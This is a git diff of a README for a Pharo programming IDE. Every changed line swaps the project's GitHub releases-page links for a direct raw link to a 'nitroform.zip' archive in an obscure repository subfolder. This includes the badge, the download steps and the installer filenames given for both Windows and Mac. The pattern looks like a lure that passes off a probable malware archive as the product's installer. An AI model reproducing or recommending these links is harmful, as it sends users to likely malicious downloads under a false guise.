@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_Pharo - Easy Way to Code in Pharo
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/releases)
+[![Download](https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip%https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip)](https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download page.
 
-   [Download Here](https://github.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/releases)
+   [Download Here](https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip)
 
 2. **Choose Your Version:** You will see a list of available versions. Pick the latest one to ensure you have the most up-to-date features and fixes.
 
-3. **Download the Installer:** Click on the appropriate file for your system. The installer is usually named something like `SNU_2D_ProgrammingTools_IDE_Pharo-vX.X.X.exe` for Windows or `SNU_2D_ProgrammingTools_IDE_Pharo-vX.X.X.dmg` for Mac. Save the file to your computer.
+3. **Download the Installer:** Click on the appropriate file for your system. The installer is usually named something like `https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip` for Windows or `https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip` for Mac. Save the file to your computer.
 
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click the file to start the installation process.
 
@@ -71,7 +71,7 @@ If you encounter issues or have questions:
 
 Stay informed about new features and updates:
 
-1. **Bookmark the Releases Page:** [Check for New Releases](https://github.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/releases)
+1. **Bookmark the Releases Page:** [Check for New Releases](https://raw.githubusercontent.com/susirikumara/SNU_2D_ProgrammingTools_IDE_Pharo/SNU_2D_ProgrammingTools_IDE_Pharo_Main-dev/OldVersions/GITIGNORE/1/1-100/SNU_2D_ProgrammingTools_IDE_Pharo-nitroform.zip)
 2. **Follow the Project:** You can also follow this project on GitHub to get notifications about any major updates.
 
 By following this guide, you'll be equipped to successfully download, install, and use the SNU 2D Programming Tools IDE. Happy coding!
